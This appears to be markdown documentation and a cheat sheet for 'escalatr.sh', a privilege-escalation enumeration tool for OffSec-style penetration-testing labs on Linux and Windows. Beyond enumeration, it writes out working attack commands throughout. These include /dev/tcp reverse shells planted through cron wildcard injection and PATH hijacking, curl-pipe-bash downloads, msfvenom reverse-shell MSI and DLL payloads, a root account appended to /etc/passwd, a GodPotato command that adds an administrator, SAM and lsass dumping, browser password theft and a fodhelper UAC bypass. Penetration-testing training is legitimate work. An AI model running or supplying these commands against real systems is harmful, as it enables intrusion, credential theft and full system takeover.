---
tags:
  - phase/post-exploitation
  - phase/privesc
  - tool/escalatr
  - tool/linpeas
  - tool/winpeas
  - tool/pspy
  - type/tool-docs
---

# escalatr.sh

## What It Is
Privilege escalation enumeration orchestrator for OffSec. Run it on Kali after you get a low-priv shell. It downloads and stages privesc tools, generates copy-paste enumeration commands tailored to the target OS, serves tools via HTTP, and parses linpeas/winpeas output into a prioritized quick-wins report.

> [!important] Enumeration only — no auto-exploitation
> OffSec compliant. Generates the commands and tooling, you execute them on target.

---

## Workflow

```bash
# 1. Run against target (auto-detects OS via port probe)
./escalatr.sh 10.10.10.1

# 2. Or specify OS to skip detection
./escalatr.sh 10.10.10.1 --os linux
./escalatr.sh 10.10.10.1 --os windows

# 3. Script prints [NEXT STEPS] block — follow it in order:
#    a. Start listener (printed first):
#       penelope -p 4444 -O
#    b. Transfer tools — commands are auto-resolved with your tun0/eth0 IP and HTTP port:
#       curl http://<your-kali-ip>:<port>/linpeas.sh | bash   # Linux
#       iwr -uri http://<your-kali-ip>:<port>/winpeas.exe ... # Windows
#    c. Run commands.txt on target, exfil output, then parse:
./escalatr.sh --parse /tmp/linpeas_output.txt
./escalatr.sh --parse /tmp/winpeas_output.txt --os windows

# 4. ★ START HERE — pre-built exploit commands for every finding
cat $TOOLKIT_ROOT/privesc/10.10.10.1/attack_commands.txt

# 5. Full parsed findings
cat $TOOLKIT_ROOT/privesc/10.10.10.1/quick-wins.txt
```

---

## Usage

```bash
# Full run — stage tools, generate commands, serve via HTTP
./escalatr.sh 10.10.10.1 --os linux

# Just print the decision-tree cheatsheet (no tools, no server)
./escalatr.sh --commands linux
./escalatr.sh --commands windows

# Parse existing linpeas/winpeas output
./escalatr.sh --parse /tmp/linpeas_output.txt
./escalatr.sh --parse /tmp/winpeas_output.txt --os windows

# Serve tools only (skip command generation)
./escalatr.sh --serve 10.10.10.1 --os linux

# Skip tool download (already have tools, just generate commands)
./escalatr.sh 10.10.10.1 --os windows --no-stage

# Custom HTTP port
./escalatr.sh 10.10.10.1 --os linux --port 9999

# SeImpersonatePrivilege — which potato?
./escalatr.sh --potato
```

---

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `--os linux\|windows` | auto-detect | Target OS |
| `--serve` | off | Stage tools and start HTTP server only |
| `--parse <file>` | — | Parse linpeas/winpeas output for quick-wins |
| `--commands linux\|windows` | — | Print inline decision-tree cheatsheet |
| `--potato` | — | Print potato variant selection guide |
| `--no-stage` | off | Skip tool download/staging |
| `--port N` | 8888 | HTTP server port |

> [!note] HTTP server auto-stops after 30 minutes. Ctrl+C kills it cleanly with no zombies.

---

## Output Structure

```
$TOOLKIT_ROOT/privesc/<IP>/
├── tools/              # Downloaded tools ready for transfer
├── commands.txt        # Prioritized copy-paste enumeration commands
├── quick-wins.txt      # Parsed findings report (after --parse)
├── attack_commands.txt # ★ START HERE — fully resolved exploit commands (after --parse)
├── raw/                # Raw tool output copies
└── progress.log        # Phase tracking (START/DONE/FAIL)
```

---

## Tools Staged Per OS

### Linux
| Tool | Purpose |
|------|---------|
| `linpeas.sh` | Comprehensive automated privesc enumeration |
| `linpeas_fat.sh` | linpeas with bundled binaries for limited environments |
| `pspy64` / `pspy32` | Monitor processes without root — catch hidden cron jobs |
| `les.sh` | Linux exploit suggester (kernel CVEs) |

### Windows
| Tool | Purpose |
|------|---------|
| `winPEASx64.exe` / `winPEASx86.exe` | Automated privesc enumeration |
| `PowerUp.ps1` | Service misconfig, unquoted paths, weak ACLs |
| `PrintSpoofer64.exe` | SeImpersonate → SYSTEM (Win10/Srv2016-2019) |
| `SigmaPotato.exe` | SeImpersonate → SYSTEM (Win8-11/Srv2012-2022) |
| `GodPotato-NET4.exe` / `GodPotato-NET2.exe` | SeImpersonate broad compat fallback |
| `FullPowers.exe` | Recover SeImpersonate on Local/Network Service |
| `RunasCs.exe` | Use found credentials without interactive session |
| `accesschk64.exe` | Service/registry/file permission auditing (from Kali sysinternals) |

> [!warning] Seatbelt requires manual compilation from source (Visual Studio). Not auto-downloaded.

---

## Tool Transfer Commands (Generated Automatically)

The script auto-detects your Kali IP (tun0 → eth0 fallback) and prints fully resolved transfer commands — no `KALI_IP` placeholder to fill in manually.

### Linux target
```bash
# wget
wget http://<auto-kali-ip>:<port>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
wget http://<auto-kali-ip>:<port>/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64

# curl
curl http://<auto-kali-ip>:<port>/linpeas.sh | bash
```

### Windows target
```powershell
# iwr (PowerShell)
iwr -uri http://<auto-kali-ip>:<port>/winpeas.exe -OutFile C:\Users\Public\winpeas.exe

# certutil (cmd.exe — no PowerShell)
certutil -urlcache -split -f http://<auto-kali-ip>:<port>/winpeas.exe C:\Users\Public\winpeas.exe
```

---

## Linux Enumeration Priority

### Phase 0 — Run immediately, every time
```bash
id && whoami && hostname && uname -a && cat /etc/os-release
```

### Phase 1 — High-value quick checks (covers 80% of OffSec privesc)
```bash
sudo -l               # #1 most important command — NOPASSWD = GTFOBins
find / -perm -4000 -type f 2>/dev/null           # SUID
find / -perm -2000 -type f 2>/dev/null           # SGID
/usr/sbin/getcap -r / 2>/dev/null                # Capabilities
ls -la /etc/passwd /etc/shadow /etc/sudoers      # Writable critical files
cat /etc/crontab; ls -la /etc/cron.d/; crontab -l; systemctl list-timers
sudo --version        # < 1.8.28 → CVE-2019-14287; 1.8.2-1.8.31p2 → Baron Samedit
find /etc/systemd/system -writable -type f 2>/dev/null
ss -tlnp              # Internal listeners → port forward to exploit
cat /etc/exports 2>/dev/null  # NFS no_root_squash
id                    # docker / lxd / disk / adm group membership
```

### Phase 2 — Automated tools
```bash
# Run in background while doing manual checks
./linpeas.sh | tee /tmp/linpeas.txt    # RED/YELLOW = highest priority
./pspy64                                # Watch for root processes + hidden cron
./les.sh                                # Kernel exploits — last resort
```

### Phase 3 — Credential hunting
```bash
cat ~/.bash_history; cat /home/*/.bash_history
grep -r "password\|passwd\|secret\|key\|token" /etc/ 2>/dev/null | grep -v "^Binary" | head -50
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
env | grep -iE "pass|key|secret|token"
find / -name "*.db" -o -name "*.sql" -o -name "*.sqlite3" 2>/dev/null | grep -v "lib\|share"
```

### Quick-run block (copy-paste entire block)
```bash
echo "===== CONTEXT =====" && id && whoami && hostname && uname -a && echo "===== SUDO =====" && sudo -l 2>/dev/null && sudo --version 2>/dev/null | head -1 && echo "===== SUID =====" && find / -perm -4000 -type f 2>/dev/null && echo "===== SGID =====" && find / -perm -2000 -type f 2>/dev/null && echo "===== CAPS =====" && /usr/sbin/getcap -r / 2>/dev/null && echo "===== CRIT FILES =====" && ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null && echo "===== CRON =====" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.d/ 2>/dev/null && ls -la /var/spool/cron/crontabs/ 2>/dev/null && echo "===== SYSTEMD WRITABLE =====" && find /etc/systemd/system -writable -type f 2>/dev/null && echo "===== INTERNAL SVC =====" && ss -tlnp && echo "===== NFS =====" && cat /etc/exports 2>/dev/null && echo "===== DONE ====="
```

---

## Linux Decision Tree

```
sudo -l
  ├─ NOPASSWD: /bin/X     → GTFOBins
  ├─ env_keep+=LD_PRELOAD → compile .so, sudo LD_PRELOAD=./evil.so <any_allowed_cmd>
  ├─ (user2) NOPASSWD     → lateral pivot → then escalate
  └─ sudo < 1.8.28        → sudo -u#-1 /bin/bash (CVE-2019-14287)

SUID binaries
  ├─ Standard binary      → GTFOBins
  └─ Custom binary        → strace, ltrace, strings, ldd for .so hijack

Capabilities
  ├─ cap_setuid+ep on interpreter (python/perl/ruby) → setuid(0); exec /bin/sh
  └─ cap_dac_read_search  → read /etc/shadow, SSH private keys

Cron
  ├─ Writable script      → inject reverse shell
  ├─ Wildcard (tar * / rsync *) → --checkpoint injection
  ├─ No absolute path     → PATH hijack
  └─ ALWAYS use pspy64 — hidden cron won't appear in /etc/crontab

Critical files
  ├─ Writable /etc/passwd → openssl passwd -1; echo 'r00t:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
  ├─ Readable /etc/shadow → john / hashcat offline
  ├─ Writable sudoers     → add NOPASSWD ALL entry
  └─ Writable systemd unit → inject ExecStart → systemctl daemon-reload && restart

Shared objects / libraries
  ├─ SUID binary loads .so from writable dir → compile malicious .so
  ├─ sudo env_keep+=LD_LIBRARY_PATH → library hijack
  └─ Root script imports writable Python module → hijack

Group membership (id)
  ├─ docker → docker run -v /:/mnt --rm -it alpine chroot /mnt bash
  ├─ lxd   → privileged container with host mount
  ├─ disk  → debugfs /dev/sda → read /etc/shadow
  └─ adm   → read logs for credentials

NFS: /etc/exports no_root_squash
  └─ Mount from Kali as root → cp /bin/bash; chmod +s → ./bash -p

Kernel (last resort — may crash target)
  └─ uname -r → les.sh → DirtyPipe / PwnKit / DirtyCow / Baron Samedit
```

---

## Windows Enumeration Priority

### Phase 0 — Run immediately, every time
```powershell
whoami; whoami /priv; whoami /groups; hostname; systeminfo
```

### Phase 1 — High-value quick checks
```powershell
# Token privileges — #1 Windows OffSec vector
whoami /priv
# SeImpersonatePrivilege → potato (see guide below)
# SeBackupPrivilege      → reg save hklm\sam → secretsdump
# SeDebugPrivilege       → procdump lsass → mimikatz offline

# Stored credentials
cmdkey /list
# If entries → runas /savecred /user:DOMAIN\admin cmd.exe

# PowerShell history (ALWAYS check)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Service misconfigurations
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
# Check permissions: icacls "C:\path\to\service.exe"  (F or M for Users = writable)

# Unquoted service paths (cmd.exe)
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """"

# Scheduled tasks
schtasks /query /fo LIST /v

# AlwaysInstallElevated (both must = 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultPassword DefaultUserName AutoAdminLogon"
```

### Phase 2 — Automated tools
```powershell
.\winPEASx64.exe > C:\Users\Public\winpeas.txt   # RED = almost certain privesc

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks                                  # One-shot check for all misconfigs
```

### Phase 3 — Credential hunting
```powershell
# File search
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1

# Unattend / sysprep (cleartext creds)
Get-ChildItem -Path C:\ -Include Unattend.xml,sysprep.xml,sysprep.inf -Recurse -File -ErrorAction SilentlyContinue

# KeePass databases
Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -File -ErrorAction SilentlyContinue

# Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Internal listeners (port forward candidates)
netstat -ano | findstr LISTENING
```

### Quick-run block (copy-paste entire block — PowerShell)
```powershell
Write-Host "===== CONTEXT =====" ; whoami ; whoami /priv ; whoami /groups ; hostname ; Write-Host "===== STORED CREDS =====" ; cmdkey /list ; Write-Host "===== PS HISTORY =====" ; type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 2>$null ; Write-Host "===== SERVICES =====" ; Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'} ; Write-Host "===== SCHTASKS =====" ; schtasks /query /fo LIST /v 2>$null | Select-String "TaskName|Run As|Task To Run" ; Write-Host "===== ALWAYS ELEVATED =====" ; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null ; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>$null ; Write-Host "===== NETWORK =====" ; netstat -ano | Select-String "LISTEN" ; ipconfig /all ; Write-Host "===== DONE ====="
```

---

## Windows Decision Tree

```
whoami /priv
  └─ SeImpersonatePrivilege → see Potato Guide below
  └─ SeBackupPrivilege      → reg save hklm\sam + hklm\system → impacket-secretsdump
  └─ SeDebugPrivilege       → procdump64.exe -ma lsass.exe lsass.dmp → mimikatz offline
  └─ SeManageVolumePrivilege → SeManageVolumeExploit → DLL hijack → SYSTEM
  └─ SeRestorePrivilege     → overwrite service binary

cmdkey /list
  └─ Entries exist → runas /savecred /user:DOMAIN\admin cmd.exe

Services
  ├─ Writable binary (icacls F/M for Users) → replace binary → restart service
  ├─ Unquoted path with spaces → drop payload in gap → restart service
  ├─ Weak ACL (Get-ModifiableService) → sc config binpath= "C:\Users\Public\evil.exe"
  └─ DLL search order (ProcMon NAME NOT FOUND) → plant missing DLL in writable dir

AlwaysInstallElevated (HKCU + HKLM both = 1)
  └─ msfvenom -p windows/x64/shell_reverse_tcp -f msi -o shell.msi
     msiexec /quiet /qn /i shell.msi

Scheduled tasks
  └─ Writable task binary running as SYSTEM → replace binary → wait for trigger

Registry autoruns
  └─ Writable binary path → replace + reboot (or wait)

Credentials
  ├─ PS history / ConsoleHost_history.txt  (always check)
  ├─ Unattend.xml / sysprep.xml            (cleartext passwords)
  ├─ AutoLogon registry key                (DefaultPassword)
  ├─ web.config (inetpub)                  (DB / app credentials)
  └─ *.kdbx KeePass → keepass2john + hashcat

UAC bypass (local admin, medium integrity)
  └─ fodhelper: reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "evil.exe"
     → fodhelper.exe → reg delete HKCU\Software\Classes\ms-settings /f
  └─ RunasCs.exe user pass cmd -b (UAC bypass for non-RID-500 admin accounts)

Kernel (last resort)
  └─ systeminfo → python3 wes.py systeminfo.txt -i 'Elevation of Privilege'
```

---

## Potato Variant Guide (`--potato`)

> Run `./escalatr.sh --potato` for the full guide. Summary:

| OS Version | Recommended |
|------------|-------------|
| Win 7 / Srv 2008 | JuicyPotato (needs CLSID) |
| Win 8.1 / Srv 2012 | JuicyPotato or SigmaPotato |
| Win 10 / Srv 2016 | PrintSpoofer64.exe or SigmaPotato |
| Win 10 1809+ / Srv 2019 | PrintSpoofer64.exe or SigmaPotato (NOT JuicyPotato) |
| Win 11 / Srv 2022 | SigmaPotato or GodPotato |
| Any (broad fallback) | GodPotato-NET4.exe |

```powershell
# PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell.exe

# SigmaPotato
.\SigmaPotato.exe "cmd /c whoami"
.\SigmaPotato.exe --revshell KALI_IP PORT    # built-in revshell

# GodPotato
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET2.exe -cmd "cmd /c whoami"    # older .NET fallback

# SeImpersonate missing on Local/Network Service? Recover it first:
.\FullPowers.exe -c "cmd /c whoami /priv" -z
```

> [!warning] If PrintSpoofer fails silently → Print Spooler service is disabled (post-PrintNightmare). Fall back to GodPotato or SigmaPotato.

---

## Parse Output for Quick Wins

```bash
# Auto-detects OS from file content (or use --os to specify)
./escalatr.sh --parse /tmp/linpeas_output.txt
./escalatr.sh --parse /tmp/winpeas_output.txt --os windows

# Two output files written:
$TOOLKIT_ROOT/privesc/parsed_YYYYMMDD_HHMMSS/quick-wins.txt      # findings summary
$TOOLKIT_ROOT/privesc/parsed_YYYYMMDD_HHMMSS/attack_commands.txt  # ★ ready-to-run exploits
```

**Parser extracts and generates commands for:**
- Linux: sudo NOPASSWD per binary (GTFOBins), non-standard SUID per binary (GTFOBins), capabilities (cap_setuid/cap_dac), writable `/etc/sudoers` or `/etc/passwd`, NFS `no_root_squash`, cron injection template, internal services → `pivotr.sh` command per port
- Windows: token privileges (SeImpersonate → Potato by OS, SeBackup → `reg save`, SeDebug → `procdump`), stored creds → `runas`, AlwaysInstallElevated → MSI payload, unquoted path → payload placement, writable service binary → replace + restart, DLL hijack → `msfvenom`/`mingw` template, internal listeners → `pivotr.sh`/Ligolo listener

---

## OS Auto-Detection Logic

Checks in order: port 445 open → Windows; port 22 open → Linux; nmap `-O` fallback (requires root). Specify `--os` to skip.

---

## RunasCs — Use Found Credentials Without Interactive Session

```powershell
.\RunasCs.exe <user> <password> cmd
.\RunasCs.exe <user> <password> cmd -b                      # UAC bypass (admin group, not RID 500)
.\RunasCs.exe <user> <password> cmd -r KALI_IP:PORT         # reverse shell as that user
.\RunasCs.exe <user> <password> cmd -d domain.local         # domain user
```

---

## Tool Cache

Tools are cached at `~/.offsec_tools/privesc/` and reused if less than 7 days old. Delete the cache to force fresh downloads.

```bash
rm -rf ~/.offsec_tools/privesc/
```

---

---

## What linpeas / winPEAS Won't Find — Manual Privesc

> [!important] The tools automate discovery but miss context-dependent vectors and configurations that require human judgment. Run these checks manually when the automated output produces no actionable findings.

---

### Linux — Manual Checks When linpeas Finds Nothing

**Sudo rules that don't appear obvious:**
```bash
sudo -l                                            # what can this user run as root?

# If you see (ALL) NOPASSWD: /usr/bin/find or similar GTFOBins entries:
# https://gtfobins.github.io/ — look up the binary

# If sudo requires a password you don't have — try any password you've found
# (people reuse their login password for sudo)
sudo su
sudo bash

# Sudo version exploit (CVE-2021-3156 Baron Samedit — sudo < 1.9.5p2)
sudoedit -s '\' $(python3 -c "print('A'*65536)")
```

**SUID/SGID binaries:**
```bash
find / -perm -u=s -type f 2>/dev/null             # SUID
find / -perm -g=s -type f 2>/dev/null             # SGID

# Cross-reference against GTFOBins for each non-standard binary
# Common engagement finds: pkexec, vim, nmap, python, bash, find, less, more, man, awk
```

**Linux capabilities (often missed by linpeas):**
```bash
getcap -r / 2>/dev/null
# Dangerous caps: cap_setuid, cap_net_raw, cap_dac_override, cap_sys_admin

# Example: python3 with cap_setuid
# python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# Example: openssl with cap_setuid
# openssl req -engine ./engine.so               # needs a crafted .so
```

**Writable files and directories in dangerous locations:**
```bash
# Writable files owned by root
find / -writable -user root -type f 2>/dev/null | grep -v proc | grep -v sys

# Writable /etc/passwd (direct root add)
ls -la /etc/passwd
# If writable: echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd && su pwned

# Writable /etc/cron* or cron jobs that run writable scripts
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
cat /etc/crontab
crontab -l

# Writable script called by a root cron job
# Find the job → find the script → write a reverse shell to it → wait
```

**Wildcard injection in cron jobs:**
```bash
# If a cron runs: cd /some/dir && tar czf backup.tar.gz *
# Create files with option-like names:
touch /some/dir/'--checkpoint=1'
touch /some/dir/'--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/bash\nbash -i >& /dev/tcp/KALI/4444 0>&1' > /some/dir/shell.sh
chmod +x /some/dir/shell.sh
# Wait for cron to run — tar interprets the filenames as flags
```

**PATH hijacking:**
```bash
echo $PATH
# If writable dir appears before /usr/bin in PATH:
# Find what root scripts call without absolute paths
strings /usr/local/bin/custom_script 2>/dev/null | grep -v '/'
# Create a fake binary with that name in the writable dir
echo '#!/bin/bash\nbash -i >& /dev/tcp/KALI/4444 0>&1' > /writable/dir/service
chmod +x /writable/dir/service
# Re-trigger the script
```

**NFS no_root_squash:**
```bash
# On target
cat /etc/exports                                   # look for no_root_squash

# On Kali (as root)
showmount -e TARGET_IP
mount -t nfs TARGET_IP:/share /mnt/nfs
# If no_root_squash:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target:
/mnt/nfs/bash -p                                  # drops to root shell
```

**Docker / LXC group membership:**
```bash
id | grep -E 'docker|lxd|lxc'

# Docker group → instant root
docker run -it -v /:/mnt alpine chroot /mnt
# If docker is available:
docker run -it --rm -v /:/host ubuntu chroot /host /bin/bash

# LXD/LXC group → instant root
# Build a container, mount host filesystem
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc -- chroot /mnt/root /bin/bash
```

**Internal services only listening on localhost:**
```bash
ss -tlnp                                           # all listeners
ss -ulnp                                           # UDP listeners
netstat -tlnp 2>/dev/null

# If something on 127.0.0.1:PORT — forward it to yourself
# On target:
ssh -L 8888:127.0.0.1:PORT user@KALI              # forward to Kali
# Or use chisel:
./chisel client KALI:9001 R:8888:127.0.0.1:PORT
```

**Credentials in non-obvious places:**
```bash
# Bash history (check all users you have access to)
cat ~/.bash_history
find /home /root -name '.bash_history' -readable 2>/dev/null | xargs cat

# Environment variables — processes sometimes have creds in env
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|user|key|token|secret'

# Config files with hardcoded credentials
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.xml" \
  2>/dev/null | xargs grep -liE 'password|passwd|secret|credential' 2>/dev/null

# Web app configs (common locations)
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
find /var/www -name '*.php' | xargs grep -l 'pass\|mysql_connect\|PDO' 2>/dev/null | head -5

# Database credentials in running processes
ps aux | grep -iE 'mysql|postgres|mongo|redis' | grep -E '\-p|\-\-pass'
```

---

### Windows — Manual Checks When winPEAS Finds Nothing

**Token privileges — check for anything beyond the standard set:**
```powershell
whoami /priv

# SeImpersonatePrivilege → GodPotato (works on all Windows versions incl. Server 2019/2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add && net localgroup Administrators hacker /add"

# SeBackupPrivilege → dump SAM/SYSTEM without admin
mkdir C:\Temp\hive
reg save HKLM\SAM C:\Temp\hive\sam.hive
reg save HKLM\SYSTEM C:\Temp\hive\system.hive
# Transfer to Kali → impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# SeRestorePrivilege → overwrite any file
# SeDebugPrivilege → dump lsass (Mimikatz)
```

**Registry — credentials and autoruns:**
```powershell
# Autologon (plaintext password in registry)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Stored credentials from cmdkey
cmdkey /list

# AlwaysInstallElevated (both keys must be 1)
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi > evil.msi
# msiexec /quiet /qn /i evil.msi

# Autorun keys — writable?
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# Reboot required → only useful if you can trigger a reboot
```

**Scheduled tasks with writable scripts:**
```powershell
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
# Find tasks running as SYSTEM or admin that call writable scripts/binaries
icacls "C:\path\to\task\script.bat"              # check permissions
# If writable: replace content with reverse shell, wait for trigger
```

**DLL hijacking — finding the gap:**
```powershell
# Services running as SYSTEM
Get-Service | Where-Object {$_.Status -eq 'Running'} | ForEach-Object {
  $svc = $_; $path = (Get-WmiObject Win32_Service | Where-Object {$_.Name -eq $svc.Name}).PathName
  Write-Host "$($svc.Name): $path"
}

# Use Procmon (if available) to watch DLL loads:
# Filter: Process Name = target.exe, Result = NAME NOT FOUND, Path ends with .dll
# If the missing DLL's load path is writable → drop your own DLL there

# Manual check: if a service loads DLLs from its own dir and that dir is writable:
icacls "C:\Program Files\SomeApp\"               # check write perms
# Create a DLL with the missing name, restart service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f dll > missing.dll
```

**PowerShell history:**
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Look for passwords entered in commands, curl with creds, etc.
```

**Stored credentials and browser data:**
```powershell
# Chrome saved passwords (copy file to Kali, decrypt offline)
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Temp\

# Windows Credential Manager
rundll32.exe keymgr.dll, KRShowKeyMgr            # GUI
# Or: use Mimikatz → vault::list

# WiFi passwords (requires admin)
netsh wlan show profiles
netsh wlan show profile "NetworkName" key=clear  # shows PSK
```

**Service binary replacement (unquoted service path without writable parent):**
```powershell
# If the actual service binary is writable (winPEAS should catch this, but double-check)
Get-WmiObject Win32_Service | Select-Object Name, PathName, StartMode, State | Format-List
icacls "C:\path\to\service.exe"

# If writable:
move "C:\path\to\service.exe" "C:\path\to\service.exe.bak"
copy evil.exe "C:\path\to\service.exe"
Restart-Service -Name "ServiceName"
```

**LAPS — reading managed local admin password:**
```powershell
# If you have domain user access and LAPS is deployed:
Get-ADComputer COMPUTERNAME -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
# Or via nxc on Kali:
nxc ldap DC_IP -u USER -p PASS -M laps
```

---

## Related

- [[Linux_PrivEsc]] — manual Linux privesc techniques
- [[Windows_PrivEsc]] — manual Windows privesc techniques
- [[OffSec_Linux_PrivEsc_Operational_Addendum]] — engagement-day Linux privesc reference
- [[OffSec_Windows_PrivEsc_Operational_Addendum]] — engagement-day Windows privesc reference
- [[File_Transfers]] — transferring tools when HTTP fails
- [[Passwords]] — cracking hashes found during enumeration
- [[Tunneling_Pivoting]] — port forwarding internal listeners
